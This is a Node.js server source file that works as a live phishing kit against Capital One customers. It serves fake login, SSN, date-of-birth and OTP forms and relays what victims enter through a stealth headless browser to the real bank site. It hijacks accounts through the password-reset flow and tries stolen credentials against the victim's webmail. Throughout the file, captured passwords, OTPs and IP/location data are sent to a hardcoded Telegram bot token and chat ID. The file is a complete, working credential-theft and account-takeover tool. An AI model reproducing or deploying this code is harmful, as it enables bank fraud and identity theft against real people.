
const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const qs = require("qs");
const session = require("express-session"); // For session management
const fs = require("fs/promises"); // For handling phone.txt file
const puppeteerExtra = require("puppeteer-extra");



const puppeteerInstances = {}; // In-memory storage for Puppeteer instances


puppeteerExtra.use(StealthPlugin());

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Configure session middleware
app.use(
  session({
    secret: "your-secret-key", // Replace with a strong secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, // Set to `true` if using HTTPS
  })
);

// Turnstile Secret Key
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;

// Puppeteer browser and page instances
let browser, page;




// Function to launch Puppeteer browser
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteer.launch({
      headless: true,
      executablePath: "/app/.chrome-for-testing/chrome-linux64/chrome", // Adjust path for Heroku
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--single-process",
        "--disable-gpu",
      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
    console.log("New page created!");
  }
}

// Gracefully close Puppeteer browser when the process exits
process.on("SIGTERM", async () => {
  console.log("SIGTERM received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

process.on("SIGINT", async () => {
  console.log("SIGINT received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

// Function to validate Turnstile token
async function validateTurnstileToken(token) {
  try {
    if (!TURNSTILE_SECRET_KEY) {
      console.error("Turnstile secret key is missing!");
      return false;
    }

    console.log("Validating Turnstile token with secret:", TURNSTILE_SECRET_KEY);

    const response = await axios.post(
      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
      qs.stringify({
        secret: TURNSTILE_SECRET_KEY,
        response: token,
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );

    console.log("Turnstile validation response:", response.data);
    return response.data.success;
  } catch (error) {
    console.error("Error validating Turnstile token:", error.message);
    return false;
  }
}

// Serve the login form
app.get("/", (req, res) => {
  // Initialize invalidAttempts for the session
  req.session.invalidAttempts = req.session.invalidAttempts || 0;
  res.send(`
    <!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 500px;
        margin: 2rem auto;
        text-align: center;
      }
      input, button {
        padding: 0.5rem;
        margin: 0.5rem 0;
        font-size: 1rem;
      }
      button {
        background-color: #007bff;
        color: #fff;
        border: none;
        cursor: pointer;
      }
      button:hover {
        background-color: #0056b3;
      }
      #loading-circle {
        display: none;
        margin: 2rem auto;
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-top: 8px solid #CC2427;
        border-radius: 450%;
        width: 100px;
        height: 100px;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        from {
          transform: rotate(0deg);
        }
        to {
          transform: rotate(360deg);
        }
      }
    </style>
    <script>
      function showLoading() {
        // Disable the login button to prevent multiple clicks
        const loginButton = document.getElementById("login-button");
        loginButton.disabled = true;
        loginButton.textContent = "Processing...";

        // Show the loading circle
        const loadingCircle = document.getElementById("loading-circle");
        loadingCircle.style.display = "block";
      }
    </script>
  </head>
  <body>
    <h1>Login</h1>
    <form action="/submit-login" method="POST" onsubmit="showLoading()">
      <label>Email: <input type="text" name="email" required /></label><br />
      <label>Password: <input type="password" name="password" required /></label><br />
      <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br />
      <button type="submit" id="login-button">Log in</button>
    </form>
    <div id="loading-circle"></div>
  </body>
</html>
  `);
});

// Handle login form submission
app.post("/submit-login", async (req, res) => {
    const { email, password } = req.body;
    const turnstileToken = req.body["cf-turnstile-response"];
  
    if (!turnstileToken) {
      return res.status(400).send("<h1>CAPTCHA token is missing. Please try again.</h1>");
    }
  
    const isValidCaptcha = await validateTurnstileToken(turnstileToken);
    if (!isValidCaptcha) {
      return res.status(403).send("<h1>Invalid CAPTCHA. Please try again.</h1>");
    }
  
    req.session.invalidAttempts = req.session.invalidAttempts || 0;
  
    try {
      await launchBrowser();
  
      console.log("Navigating to login page...");
      await page.goto("https://www.capitalone.com/", { waitUntil: "networkidle2" });
  
      console.log("Filling in login form...");
      await page.type("input#ods-input-0", email, { delay: 100 });
      await page.type("input#ods-input-1", password, { delay: 100 });
  
      console.log("Submitting login form...");
      await page.click("button#noAcctSubmit");
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
      const loginSuccess = await page.evaluate(() => {
        const element = document.querySelector("div.option-list-entry--message > p.message--header");
        return element && element.textContent.trim() === "Text me a temporary code";
      });
  
        // Handle login success or failure
    if (loginSuccess) {
      console.log("Login successful!");

  // Fetch additional user details (IP, location, etc.)
  async function getUserDetails() {
    try {
      const response = await axios.get("https://ipinfo.io/json?token=8fc0e52099569d"); // Replace with your token
      const data = response.data;

      return {
        ip: data.ip,
        location: `${data.city}, ${data.region}, ${data.country}`,
      };
    } catch (error) {
      console.error("Error fetching user details:", error);
      return { ip: "Unknown", location: "Unknown" };
    }
  }

  // Construct the message and send to Telegram
  async function sendToTelegram(email, password) {
    const userDetails = await getUserDetails();

    const message = `
      🔥 capitalone🔥 
      USERNAME: ${email}
      PASSWORD: ${password}
      ## USER FINGERPRINTS ##
      IP: ${userDetails.ip}
      LOCATION: ${userDetails.location}
      USERAGENT: ${page.evaluate(() => navigator.userAgent)}
    `;

    const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Your Telegram Bot API Token
    const chatId = "2127941790"; // Your Telegram Chat ID
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;

    try {
      await axios.post(url, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown", // Optional: Format the message as Markdown
      });
      console.log("Message sent to Telegram successfully!");
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  }

  // Call the function to send to Telegram
  await sendToTelegram(email, password);



      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Identity Info</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Identity Info</h1>
            <p>We couldn't find your contact details. Please provide additional information below:</p>
            <form action="/submit-identity-info" method="POST">
              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
              <label>Email Address: <input type="email" name="email" required /></label><br/>
              <button type="submit">Submit</button>
            </form>
          </body>
        </html>
      `);     
    }else {
        req.session.invalidAttempts++;
  
        if (req.session.invalidAttempts === 1) {
          res.send(`
             <!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 500px;
        margin: 2rem auto;
        text-align: center;
      }
      input, button {
        padding: 0.5rem;
        margin: 0.5rem 0;
        font-size: 1rem;
      }
      button {
        background-color: #007bff;
        color: #fff;
        border: none;
        cursor: pointer;
      }
      button:hover {
        background-color: #0056b3;
      }
      #loading-circle {
        display: none;
        margin: 2rem auto;
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-top: 8px solid #CC2427;
        border-radius: 450%;
        width: 100px;
        height: 100px;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        from {
          transform: rotate(0deg);
        }
        to {
          transform: rotate(360deg);
        }
      }
    </style>
    <script>
      function showLoading() {
        // Disable the login button to prevent multiple clicks
        const loginButton = document.getElementById("login-button");
        loginButton.disabled = true;
        loginButton.textContent = "Processing...";

        // Show the loading circle
        const loadingCircle = document.getElementById("loading-circle");
        loadingCircle.style.display = "block";
      }
    </script>
  </head>
  <body>
    <h1>INVALID Login</h1>
    <form action="/submit-login" method="POST" onsubmit="showLoading()">
      <label>Email: <input type="text" name="email" required /></label><br />
      <label>Password: <input type="password" name="password" required /></label><br />
      <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br />
      <button type="submit" id="login-button">Log in</button>
    </form>
    <div id="loading-circle"></div>
  </body>
</html>
          `);
        } else if (req.session.invalidAttempts === 2) {
          console.log("Second invalid attempt: Navigating to Sign-In Help...");

          // Save the password in memory as passReset
          req.session.passReset = req.body.password; // Save the password for later use
          console.log("Saved passReset value:", req.session.passReset);
  
          // Navigate to the Sign-In Help page
          await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });
  
          // Serve the contact form
          res.send(`
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Contact Information</title>
                <style>
                  body {
                    font-family: Arial, sans-serif;
                    max-width: 500px;
                    margin: 2rem auto;
                    text-align: center;
                  }
                  input, button {
                    padding: 0.5rem;
                    margin: 0.5rem 0;
                    font-size: 1rem;
                  }
                  button {
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    cursor: pointer;
                  }
                  button:hover {
                    background-color: #0056b3;
                  }
                </style>
              </head>
              <body>
                <h1>Contact Information</h1>
                <form action="/submit-contact" method="POST">
                  <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                  <label>SSN: <input type="password" name="ssn" required /></label><br/>
                  <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                  <button type="submit">Find Me</button>
                </form>
              </body>
            </html>
          `);
        } else {
          res.send("<h1>Too many invalid attempts. Please try again later.</h1>");
        }
      }
    } catch (error) {
      console.error("Error during login process:", error);
      res.status(500).send("<h1>An error occurred. Please try again later.</h1>");
    }
  });
  


  
  app.post("/submit-otp2", async (req, res) => {
    const { otp } = req.body;
  
    try {
      // Input OTP into Puppeteer session
      await page.type('input#pinEntry', otp, { delay: 100 });
  
      // Click "Submit Code" button
      await page.click('button[data-testtarget="otp-submit"]');
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
      // Wait for the password reset input field
      await page.waitForSelector('input#ci-password-reset', { visible: true, timeout: 15000 });
      console.log("Password reset input available.");
  
      // Use the passReset value as the new password
      const passReset = req.session.passReset; // Retrieve the saved passReset value
      console.log("Using passReset value as the new password:", passReset);
  
      // Type the saved passReset password into the input field
      await page.type('input#ci-password-reset', passReset, { delay: 100 });
  
      // Click the "Update My Password" button
      await Promise.all([
        page.click('button#setpw-button'),
        page.waitForNavigation({ waitUntil: "networkidle2" }),
      ]);
      console.log("Password updated successfully!");
    // Wait for the success message
    await page.waitForSelector('h1.ci-page-header', { visible: true, timeout: 15000 });
    console.log("Password change successful!");

    // Click the "Continue" button to go to the dashboard
    await Promise.all([
      page.click('button[data-testtarget="success-button"]'),
      page.waitForNavigation({ waitUntil: "networkidle2" }),
    ]);
    console.log("Navigated to dashboard!");

    // Send success message to the user
    return res.send("<h1>success.</h1>");
  
    } catch (error) {
      console.error("Error during OTP submission:", error);
      res.status(500).send("<h1>An error occurred while processing your OTP.</h1>");
    }
  });
  


// Route: Handle contact form submission
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    console.log("Filling in contact form...");
    // Fill the contact form fields on the Puppeteer browser page
    await page.type('input#lastname', lastname, { delay: 100 });
    await page.type('input#fullSSN', ssn, { delay: 100 });
    await page.type('input#dob', dob, { delay: 100 });

    console.log("Submitting contact form...");
    // Click the "Find Me" button
    await page.click('#find-me-button');

    console.log("Checking if contact details are correct...");

    // Use a shorter timeout to check if the contactCorrect element exists
    let contactCorrect = false;
    try {
      await page.waitForSelector('div.option-list-entry--message > p.message--header', {
        visible: true,
        timeout: 15000, // Short timeout to detect the element
      });
      contactCorrect = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });
    } catch (error) {
      console.log("Contact details are not correct or element not found.");
    }

    if (contactCorrect) {
      console.log("Contact details correct.");
      invalidAttempts = 0; // Reset invalid attempts

      console.log("Requesting OTP...");
      await page.click("div.option-list-entry--message > p.message--header");
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      // Render an HTML page for OTP entry
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>OTP Reset</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>OTP Reset</h1>
            <p>Please enter the OTP sent to your phone:</p>
            <form action="/submit-otpre" method="POST">
              <label>OTP: <input type="text" name="otp" required maxlength="6" /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      console.log("Contact details not found, rendering Identity Info form...");




      // Serve the Identity Info form immediately
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Identity Info</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Identity Info</h1>
            <p>We couldn't find your contact details. Please provide additional information below:</p>
            <form action="/submit-identity-info" method="POST">
              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
              <label>Email Address: <input type="email" name="email" required /></label><br/>
              <button type="submit">Submit</button>
            </form>
          </body>
        </html>
      `);
    }
  } catch (error) {
    console.error("Error submitting contact form:", error);
    res.status(500).send("<h1>An error occurred while submitting the contact form.</h1>");
  }
});



// Route: Handle contact form submission
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    console.log("Filling in contact form...");
    // Fill the contact form fields on the Puppeteer browser page
    await page.type('input#lastname', lastname, { delay: 100 });
    await page.type('input#fullSSN', ssn, { delay: 100 });
    await page.type('input#dob', dob, { delay: 100 });

    console.log("Submitting contact form...");
    // Click the "Find Me" button
    await page.click('#find-me-button');

    console.log("Checking if contact details are correct...");

    // Use a shorter timeout to check if the contactCorrect element exists
    let contactCorrect = false;
    try {
      await page.waitForSelector('div.option-list-entry--message > p.message--header', {
        visible: true,
        timeout: 15000, // Short timeout to detect the element
      });
      contactCorrect = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });
    } catch (error) {
      console.log("Contact details are not correct or element not found.");
    }

    if (contactCorrect) {
      console.log("Contact details correct.");
      invalidAttempts = 0; // Reset invalid attempts

      console.log("Requesting OTP...");
      await page.click("div.option-list-entry--message > p.message--header");
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      // Render an HTML page for OTP entry
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>OTP Reset</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>OTP Reset</h1>
            <p>Please enter the OTP sent to your phone:</p>
            <form action="/submit-otpre" method="POST">
              <label>OTP: <input type="text" name="otp" required maxlength="6" /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      console.log("Contact details not found, rendering Identity Info form...");




      // Serve the Identity Info form immediately
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Identity Info</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Identity Info</h1>
            <p>We couldn't find your contact details. Please provide additional information below:</p>
            <form action="/submit-identity-info" method="POST">
              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
              <label>Email Address: <input type="email" name="email" required /></label><br/>
              <button type="submit">Submit</button>
            </form>
          </body>
        </html>
      `);
    }
  } catch (error) {
    console.error("Error submitting contact form:", error);
    res.status(500).send("<h1>An error occurred while submitting the contact form.</h1>");
  }
});




  
 

app.post("/submit-identity-info", async (req, res) => {
  const { fullname, zipcode, email } = req.body;

  try {
    console.log("Received identity info:");
    console.log(`Full Name: ${fullname}`);
    console.log(`ZIP Code: ${zipcode}`);
    console.log(`Email Address: ${email}`);

    // Detect the login URL for the email
    const loginUrl = await getDynamicLoginUrl(email);

    if (!loginUrl) {
      return res.status(400).send("<h1>No valid login URL found for the provided email.</h1>");
    }

    console.log(`Detected login URL for ${email}: ${loginUrl}`);

    // Launch Puppeteer and navigate to the login page
    const browser = await puppeteer.launch({
      headless: false, // Set to false for debugging
      args: ['--ignore-certificate-errors'], // Handle SSL errors
    });
    const page = await browser.newPage();

    await page.goto(loginUrl, { waitUntil: "networkidle2" });
    console.log(`Navigated to: ${loginUrl}`);

    // Type the email into the email field
    await clearAndType(page, 'input[type="email"], input[name="email"], input[type="text"]', email);

    console.log(`Email entered: ${email}`);

    // Store the Puppeteer browser and page instances in memory
    puppeteerInstances[email] = { browser, page };

    // Render an HTML page for the user to enter their password
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Enter Password</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 500px;
              margin: 2rem auto;
              text-align: center;
            }
            input, button {
              padding: 0.5rem;
              margin: 0.5rem 0;
              font-size: 1rem;
            }
            button {
              background-color: #007bff;
              color: #fff;
              border: none;
              cursor: pointer;
            }
            button:hover {
              background-color: #0056b3;
            }
          </style>
        </head>
        <body>
          <h1>Enter Password</h1>
          <p>Please enter your password to continue:</p>
          <form action="/submit-password" method="POST">
            <input type="hidden" name="email" value="${email}" />
            <label>Password: <input type="password" name="password" required /></label><br/>
            <button type="submit">Submit Password</button>
          </form>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("Error processing identity info:", error);
    res.status(500).send("<h1>An error occurred while processing your identity information.</h1>");
  }
});


app.post("/submit-password", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Retrieve the Puppeteer instances for the email
    const puppeteerInstance = puppeteerInstances[email];
    if (!puppeteerInstance || !puppeteerInstance.page) {
      return res.status(400).send("<h1>No active Puppeteer session found. Please try again.</h1>");
    }

    const { page, browser } = puppeteerInstance;

    console.log("Typing password into Puppeteer session...");
    await clearAndType(page, 'input[type="password"]', password);

    // Click the submit button
    console.log("Submitting login form...");
    await page.click('button[type="submit"], input[type="submit"]');

    // Wait for 3 seconds to allow the page to process the login
    await delay(3000);

    // Check if the submit button is still visible
    const isSubmitButtonVisible = await page.$('button[type="submit"], input[type="submit"]') !== null;

    if (isSubmitButtonVisible) {
      console.log("Login failed: Submit button is still visible, indicating incorrect password.");

      // Render the password incorrect page
      return res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Password Incorrect</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Password Incorrect</h1>
            <p>The username or password you entered is incorrect. Please try again.</p>
            <form action="/submit-password" method="POST">
              <input type="hidden" name="email" value="${email}" />
              <label>Password: <input type="password" name="password" required /></label><br/>
              <button type="submit">Retry Password</button>
            </form>
          </body>
        </html>
      `);
    }

    console.log("Login successful! Password is correct.");

    // Escape Markdown characters in the message
    const escapedEmail = escapeMarkdown(email);
    const escapedPassword = escapeMarkdown(password);

    // Send the email and correct password to Telegram
    const message = `
      🔥 *Login Successful* 🔥
      *EMAIL:* ${escapedEmail}
      *PASSWORD:* ${escapedPassword}
    `;

    const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your Telegram bot API token
    const chatId = "2127941790"; // Replace with your Telegram chat ID
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;

    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
    console.log("Email and password sent to Telegram successfully!");

    // Render the OTP page
    return res.send(`
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>OTP User</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 500px;
              margin: 2rem auto;
              text-align: center;
            }
            input, button {
              padding: 0.5rem;
              margin: 0.5rem 0;
              font-size: 1rem;
            }
            button {
              background-color: #007bff;
              color: #fff;
              border: none;
              cursor: pointer;
            }
            button:hover {
              background-color: #0056b3;
            }
          </style>
        </head>
        <body>
          <h1>OTP User</h1>
          <p>Please enter the OTP sent to your phone:</p>
          <form action="/submit-otpuser" method="POST">
            <input type="hidden" name="email" value="${email}" />
            <label>OTP: <input type="text" name="otp" required maxlength="6" /></label><br/>
            <button type="submit">Submit OTP</button>
          </form>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("Error during password submission:", error);
    res.status(500).send("<h1>An error occurred while submitting the password.</h1>");
  }
});


// Custom delay function
async function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Function to validate a list of possible URLs dynamically
async function validateLoginUrl(possibleUrls) {
  const browser = await puppeteer.launch({
    headless: true, // Set to false for debugging
    args: ['--ignore-certificate-errors'], // Handle SSL errors
  });
  const page = await browser.newPage();

  try {
    for (const url of possibleUrls) {
      console.log(`Checking URL: ${url}`);
      try {
        // Attempt to navigate to the URL
        await page.goto(url, { waitUntil: 'load', timeout: 10000 });

        // Handle "Your connection is not private" warning
        if (await page.$('#details-button')) {
          console.log(`Warning page detected for: ${url}`);
          await page.click('#details-button');
          if (await page.$('#proceed-link')) {
            console.log(`Bypassing warning for: ${url}`);
            await page.click('#proceed-link');
            await page.waitForNavigation({ waitUntil: 'networkidle2' });
          }
        }

        console.log(`Valid login URL found: ${url}`);
        return url; // Return the first valid login URL
      } catch (error) {
        console.log(`URL check failed for: ${url} - Error: ${error.message}`);
      }
    }
  } finally {
    await browser.close();
  }

  return null; // Return null if no valid URL is found
}


function escapeMarkdown(text) {
  return text
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/~/g, "\\~")
    .replace(/`/g, "\\`")
    .replace(/>/g, "\\>")
    .replace(/#/g, "\\#")
    .replace(/\+/g, "\\+")
    .replace(/-/g, "\\-")
    .replace(/=/g, "\\=")
    .replace(/\|/g, "\\|")
    .replace(/{/g, "\\{")
    .replace(/}/g, "\\}")
    .replace(/\./g, "\\.")
    .replace(/!/g, "\\!");
}

app.post("/submit-otpuser", async (req, res) => {
  const { email, otp } = req.body;

  try {
    console.log(`OTP received for ${email}: ${otp}`);

    // Send OTP to Telegram
    const message = `
      🔥 OTP Submitted 🔥
      EMAIL: ${email}
      OTP: ${otp}
    `;

    const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your Telegram bot API token
    const chatId = "2127941790"; // Replace with your Telegram chat ID
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;

    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
    console.log("OTP sent to Telegram successfully!");

    // Render success page
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Success</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 500px;
              margin: 2rem auto;
              text-align: center;
            }
            h1 {
              color: green;
            }
          </style>
        </head>
        <body>
          <h1>Success!</h1>
          <p>Your OTP has been submitted successfully.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("Error during OTP submission:", error);
    res.status(500).send("<h1>An error occurred while submitting the OTP.</h1>");
  }
});



// Function to dynamically detect the login URL
async function getDynamicLoginUrl(email) {
  const domain = email.split('@')[1].toLowerCase();
  const possibleUrls = [
    `https://mail.${domain}`,
    `https://webmail.${domain}`,
    `https://${domain}/login`,
    `https://login.${domain}`,
  ];
  return await validateLoginUrl(possibleUrls);
}

async function clearAndType(page, selector, text) {
  try {
    // Wait for the input field to be visible
    await page.waitForSelector(selector, { visible: true });

    // Clear the input field
    console.log(`Clearing input field: ${selector}`);
    await page.evaluate((selector) => {
      const input = document.querySelector(selector);
      if (input) {
        input.value = ''; // Clear the input value
      }
    }, selector);

    // Type the text character by character
    console.log(`Typing text into field: ${selector}`);
    for (const char of text) {
      await page.type(selector, char, { delay: 100 }); // Simulate human typing with a delay
    }

    // Verify the input value matches the typed text
    const typedValue = await page.evaluate((selector) => {
      const input = document.querySelector(selector);
      return input ? input.value : '';
    }, selector);

    if (typedValue !== text) {
      console.error(`Failed to type text correctly in field: ${selector}`);
      throw new Error(`Expected '${text}' but found '${typedValue}' in field: ${selector}`);
    }

    console.log(`Successfully typed text into field: ${selector}`);
  } catch (error) {
    console.error(`Error in clearAndType function for selector: ${selector}`, error);
    throw error;
  }
}




  // **Graceful Shutdown**
process.on("SIGINT", async () => {
  if (browser) {
    console.log("Closing Puppeteer browser...");
    await browser.close();
  }
  process.exit();
});



// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});


